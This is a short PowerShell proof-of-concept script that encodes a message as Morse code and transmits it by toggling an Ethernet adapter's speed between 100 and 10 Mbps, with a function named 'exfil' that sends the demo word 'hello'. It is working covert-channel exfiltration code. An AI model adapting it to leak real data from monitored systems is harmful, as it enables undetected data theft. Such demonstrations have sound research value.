
function dot {
echo "dot"
Set-NetAdapterAdvancedProperty -name "Ethernet" -DisplayName "Speed & Duplex" -DisplayValue "100 Mbps Full Duplex"
Start-Sleep -s 2
Set-NetAdapterAdvancedProperty -name "Ethernet" -DisplayName "Speed & Duplex" -DisplayValue "10 Mbps Full Duplex"    
}
function line{
echo "line"
Set-NetAdapterAdvancedProperty -name "Ethernet" -DisplayName "Speed & Duplex" -DisplayValue "100 Mbps Full Duplex"
Start-Sleep -s 8
Set-NetAdapterAdvancedProperty -name "Ethernet" -DisplayName "Speed & Duplex" -DisplayValue "10 Mbps Full Duplex"

}
function space{
echo "space"
Start-Sleep -s 4
}

function ToMorse{
    param ([string]$Text)
    #echo $Text
    $global:result = ''
    $letterArray =@(
        'a','b','c','d','e','f','g','h','i','j','k',
        'l','m','n','o','p','q','r','s','t','u','v',
        'w','x','y','z','0','1','2','3','4','5','6',
        '7','8','9'
    )
    $morseArray =@(
        '.-','-...','-.-.','-..','.','..-.','--.',
        '....','..','.---','-.-','.-..','--','-.',
        '---','.--.','--.-','.-.','...','-','..-',
        '...-','.--','-..-','-.--','--..','-----',
        '.----','..---','...--','....-','.....',
        '-....','--...','---..','----.'
    )
    foreach ($char in $Text.ToCharArray()){
        #write-host $char
        $index = 0
        #$result = ''
        foreach ($letter in $letterArray){
            if ($letter -eq $char){
                #write-host $morseArray[$index]
                $global:result = $global:result + $morseArray[$index]
                $global:result = $global:result + ' '
            }
            $index = $index + 1
        }
    }
    #write-host "Result: "$global:result
}
function exfil{
    param([string]$Message)
    echo "Message to be Sent: " $Message

    ToMorse -Text $Message
    echo "Morse: " $global:result

    foreach ($char in $global:result.ToCharArray()){
        if ($char -eq '.'){dot}
        elseif ($char -eq '-'){line}
        elseif ($char -eq ' '){space}
        else{echo "Char Error"}
    }
}


#hello
#.... . .-.. .-.. ---

#ToMorse -Text hello

exfil -Message hello

Set-NetAdapterAdvancedProperty -name "Ethernet" -DisplayName "Speed & Duplex" -DisplayValue "10 Mbps Full Duplex"
echo "Done."